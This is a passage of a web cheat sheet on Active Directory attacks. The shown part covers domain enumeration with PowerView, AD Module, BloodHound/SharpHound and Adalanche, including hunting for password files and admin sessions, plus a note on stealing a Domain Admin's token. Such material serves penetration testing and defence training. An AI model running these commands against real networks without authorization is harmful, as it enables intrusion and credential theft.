<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Active Directory Exploitation Cheat Sheet - readloud.org</title>
    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Active Directory Exploitation Cheat Sheet", url: "#_top", children: [
              {title: "Domain Enumeration", url: "#domain-enumeration" },
              {title: "Local Privilege Escalation", url: "#local-privilege-escalation" },
              {title: "Lateral Movement", url: "#lateral-movement" },
              {title: "Domain Privilege Escalation", url: "#domain-privilege-escalation" },
              {title: "DNSAdmins Abuse", url: "#dnsadmins-abuse" },
              {title: "SID History Abuse", url: "#sid-history-abuse" },
              {title: "Exploiting SharePoint", url: "#exploiting-sharepoint" },
              {title: "Cross Forest Attacks", url: "#cross-forest-attacks" },
          ]},
        ];

    </script>
    <script src="../../../../js/base.js"></script>
      <script src="../../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h1 id="active-directory-exploitation-cheat-sheet">Active Directory Exploitation Cheat Sheet</h1>
<p>This cheat sheet contains common enumeration and attack methods for Windows Active Directory.</p>
<p>This cheat sheet is inspired by the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadAllTheThings</a> repo.</p>
<p><img alt="Just Walking The Dog" src="/images/WalkTheDog.png" /></p>
<h2 id="domain-enumeration">Domain Enumeration</h2>
<ul>
<li>Using PowerView</li>
</ul>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview v.3.0</a><br>
<a href="https://powersploit.readthedocs.io/en/latest/">Powerview Wiki</a></p>
<ul>
<li><strong>Get Current Domain:</strong> <code>Get-Domain</code></li>
<li><strong>Enumerate Other Domains:</strong> <code>Get-Domain -Domain &lt;DomainName&gt;</code></li>
<li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li>
<li><strong>Get Domain Policy:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>  Get-DomainPolicy
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>  #Will show us the policy configurations of the Domain about system access or kerberos
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
</span></code></pre></div>
<ul>
<li><strong>Get Domain Controllers:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>  Get-DomainController
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  Get-DomainController -Domain &lt;DomainName&gt;
</span></code></pre></div></li>
<li><strong>Enumerate Domain Users:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>  #Save all Domain Users to a file
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>  #Will return specific properties of a specific user
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>  #Enumerate user logged on a machine
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>  Get-NetLoggedon -ComputerName &lt;ComputerName&gt;
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>  #Enumerate Session Information for a machine
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>  Get-NetSession -ComputerName &lt;ComputerName&gt;
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>  #Enumerate domain machines of the current/specified domain where specific users are logged into
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>  Find-DomainUserLocation -Domain &lt;DomainName&gt; | Select-Object UserName, SessionFromName
</span></code></pre></div>
<ul>
<li><strong>Enum Domain Computers:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>  #Enumerate Live machines
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
</span></code></pre></div>
<ul>
<li><strong>Enum Groups and Group Members:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>  #Save all Domain Groups to a file:
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>  #Return members of Specific Group (eg. Domain Admins &amp; Enterprise Admins)
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>  Get-DomainGroup -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object -ExpandProperty Member
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>  Get-DomainGroupMember -Identity &#39;&lt;GroupName&gt;&#39; | Select-Object MemberDistinguishedName
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>  Get-NetLocalGroup | Select-Object GroupName
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
</span></code></pre></div>
<ul>
<li><strong>Enumerate Shares:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>  #Enumerate Domain Shares
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>  Find-DomainShare
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>  #Enumerate Domain Shares the current user has access
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>  Find-DomainShare -CheckShareAccess
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>  #Enumerate &quot;Interesting&quot; Files on accessible shares
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>  Find-InterestingDomainShareFile -Include *passwords*
</span></code></pre></div>
<ul>
<li><strong>Enum Group Policies:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>  #Enumerate all GPOs to a specific computer
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>  Get-DomainGPO -ComputerIdentity &lt;ComputerName&gt; -Properties DisplayName | Sort-Object -Property DisplayName
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>  #Get users that are part of a Machine&#39;s local Admin group
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>  Get-DomainGPOComputerLocalGroupMapping -ComputerName &lt;ComputerName&gt;
</span></code></pre></div>
<ul>
<li><strong>Enum OUs:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>  Get-DomainOU -Properties Name | Sort-Object -Property Name
</span></code></pre></div></li>
<li><strong>Enum ACLs:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>  # Returns the ACLs associated with the specified account
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>  Get-DomaiObjectAcl -Identity &lt;AccountName&gt; -ResolveGUIDs
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>  #Search for interesting ACEs
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>  Find-InterestingDomainAcl -ResolveGUIDs
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>  #Check the ACLs associated with a specified path (e.g smb share)
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>  Get-PathAcl -Path &quot;\\Path\Of\A\Share&quot;
</span></code></pre></div>
<ul>
<li><strong>Enum Domain Trust:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>  Get-DomainTrust
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>  Get-DomainTrust -Domain &lt;DomainName&gt;
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>  Get-DomainTrustMapping
</span></code></pre></div>
<ul>
<li><strong>Enum Forest Trust:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>  Get-ForestDomain
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>  Get-ForestDomain -Forest &lt;ForestName&gt;
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>  #Map the Trust of the Forest
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>  Get-ForestTrust
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>  Get-ForestTrust -Forest &lt;ForestName&gt;
</span></code></pre></div>
<ul>
<li><strong>User Hunting:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>  #Finds all machines on the current domain where the current user has local admin access
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>  Find-LocalAdminAccess -Verbose
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>  #Find local admins on all machines of the domain
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>  Find-DomainLocalGroupMember -Verbose
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>  #Find computers were a Domain Admin OR a spesified user has a session
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>  Find-DomainUserLocation | Select-Object UserName, SessionFromName
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>  #Confirming admin access
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>  Test-AdminAccess
</span></code></pre></div>
<p>:heavy_exclamation_mark: <strong>Priv Esc to Domain Admin with User Hunting:</strong> \
  I have local admin access on a machine -&gt; A Domain Admin has a session on that machine -&gt; I steal his token and impersonate him -&gt; Profit!</p>
<ul>
<li>
<p>Using AD Module</p>
</li>
<li>
<p><strong>Get Current Domain:</strong> <code>Get-ADDomain</code></p>
</li>
<li><strong>Enum Other Domains:</strong> <code>Get-ADDomain -Identity &lt;Domain&gt;</code></li>
<li><strong>Get Domain SID:</strong> <code>Get-DomainSID</code></li>
<li><strong>Get Domain Controlers:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>  Get-ADDomainController
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  Get-ADDomainController -Identity &lt;DomainName&gt;
</span></code></pre></div>
<ul>
<li><strong>Enumerate Domain Users:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>  Get-ADUser -Filter * -Identity &lt;user&gt; -Properties *
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>  #Get a spesific &quot;string&quot; on a user&#39;s attribute
</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>  Get-ADUser -Filter &#39;Description -like &quot;*wtver*&quot;&#39; -Properties Description | select Name, Description
</span></code></pre></div>
<ul>
<li><strong>Enum Domain Computers:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>  Get-ADComputer -Filter * -Properties *
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>  Get-ADGroup -Filter *
</span></code></pre></div></li>
<li><strong>Enum Domain Trust:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>  Get-ADTrust -Filter *
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>  Get-ADTrust -Identity &lt;DomainName&gt;
</span></code></pre></div></li>
<li><strong>Enum Forest Trust:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>  Get-ADForest
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>  Get-ADForest -Identity &lt;ForestName&gt;
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>  #Domains of Forest Enumeration
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>  (Get-ADForest).Domains
</span></code></pre></div>
<ul>
<li><strong>Enum Local AppLocker Effective Policy:</strong></li>
</ul>
<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
</span></code></pre></div>
<ul>
<li>
<p>Using BloodHound</p>
</li>
<li>
<p>Remote BloodHound</p>
</li>
</ul>
<p><a href="https://github.com/fox-it/BloodHound.py">Python BloodHound Repository</a> or install it with <code>pip3 install bloodhound</code></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">bloodhound-python</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="n">-ns</span> <span class="p">&lt;</span><span class="n">Domain</span> <span class="n">Controller</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">Ip</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;</span> <span class="n">-c</span> <span class="n">All</span>
</span></code></pre></div>
<ul>
<li>On Site BloodHound</li>
</ul>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c">#Using exe ingestor</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">exe</span> <span class="p">-</span><span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="p">-</span><span class="n">-LdapUsername</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-LdapPassword</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-domain</span> <span class="p">&lt;</span><span class="n">Domain</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-domaincontroller</span> <span class="p">&lt;</span><span class="n">Domain</span> <span class="n">Controller</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">Ip</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-OutputDirectory</span> <span class="p">&lt;</span><span class="n">PathToFile</span><span class="p">&gt;</span>
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c">#Using PowerShell module ingestor</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="p">.</span> <span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="n">ps1</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="nb">Invoke-BloodHound</span> <span class="n">-CollectionMethod</span> <span class="n">All</span> <span class="p">-</span><span class="n">-LdapUsername</span> <span class="p">&lt;</span><span class="n">UserName</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-LdapPassword</span> <span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-OutputDirectory</span> <span class="p">&lt;</span><span class="n">PathToFile</span><span class="p">&gt;</span>
</span></code></pre></div>
<ul>
<li>
<p>Using Adalanche</p>
</li>
<li>
<p>Remote Adalanche</p>
</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="c1"># kali linux:</span>
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>./adalanche<span class="w"> </span>collect<span class="w"> </span>activedirectory<span class="w"> </span>--domain<span class="w"> </span>&lt;Domain&gt;<span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>--username<span class="w"> </span>&lt;Username@Domain&gt;<span class="w"> </span>--password<span class="w"> </span>&lt;Password&gt;<span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>--server<span class="w"> </span>&lt;DC&gt;
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="c1"># Example:</span>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a>./adalanche<span class="w"> </span>collect<span class="w"> </span>activedirectory<span class="w"> </span>--domain<span class="w"> </span>windcorp.local<span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a>--username<span class="w"> </span>spoNge369@windcorp.local<span class="w"> </span>--password<span class="w"> </span><span class="s1">&#39;password123!&#39;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>--server<span class="w"> </span>dc.windcorp.htb
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c1">## -&gt; Terminating successfully</span>
</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a>
</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a><span class="c1">## Any error?:</span>
</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a>
</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="c1"># LDAP Result Code 200 &quot;Network Error&quot;: x509: certificate signed by unknown authority ?</span>
</span><span id="__span-20-15"><a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a>
</span><span id="__span-20-16"><a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a>./adalanche<span class="w"> </span>collect<span class="w"> </span>activedirectory<span class="w"> </span>--domain<span class="w"> </span>windcorp.local<span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-17"><a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a>--username<span class="w"> </span>spoNge369@windcorp.local<span class="w"> </span>--password<span class="w"> </span><span class="s1">&#39;password123!&#39;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-18"><a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>--server<span class="w"> </span>dc.windcorp.htb<span class="w"> </span>--tlsmode<span class="w"> </span>NoTLS<span class="w"> </span>--port<span class="w"> </span><span class="m">389</span>
</span><span id="__span-20-19"><a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a>
</span><span id="__span-20-20"><a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a><span class="c1"># Invalid Credentials ?</span>
</span><span id="__span-20-21"><a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a>./adalanche<span class="w"> </span>collect<span class="w"> </span>activedirectory<span class="w"> </span>--domain<span class="w"> </span>windcorp.local<span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-22"><a id="__codelineno-20-22" name="__codelineno-20-22" href="#__codelineno-20-22"></a>--username<span class="w"> </span>spoNge369@windcorp.local<span class="w"> </span>--password<span class="w"> </span><span class="s1">&#39;password123!&#39;</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-23"><a id="__codelineno-20-23" name="__codelineno-20-23" href="#__codelineno-20-23"></a>--server<span class="w"> </span>dc.windcorp.htb<span class="w"> </span>--tlsmode<span class="w"> </span>NoTLS<span class="w"> </span>--port<span class="w"> </span><span class="m">389</span><span class="w"> </span><span class="se">\</span>
</span><span id="__span-20-24"><a id="__codelineno-20-24" name="__codelineno-20-24" href="#__codelineno-20-24"></a>--authmode<span class="w"> </span>basic
</span><span id="__span-20-25"><a id="__codelineno-20-25" name="__codelineno-20-25" href="#__codelineno-20-25"></a>
</span><span id="__span-20-26"><a id="__codelineno-20-26" name="__codelineno-20-26" href="#__codelineno-20-26"></a><span class="c1"># Analyze data </span>
</span><span id="__span-20-27"><a id="__codelineno-20-27" name="__codelineno-20-27" href="#__codelineno-20-27"></a><span class="c1"># go to web browser -&gt; 127.0.0.1:8080</span>
</span><span id="__span-20-28"><a id="__codelineno-20-28" name="__codelineno-20-28" href="#__codelineno-20-28"></a>./adalanche<span class="w"> </span>analyze
</span></code></pre></div>
<ul>
<li>
<p>Useful Enumeration Tools</p>
</li>
<li>
<p><a href="https://github.com/dirkjanm/ldapdomaindump">ldapdomaindump</a> Information dumper via LDAP</p>
</li>
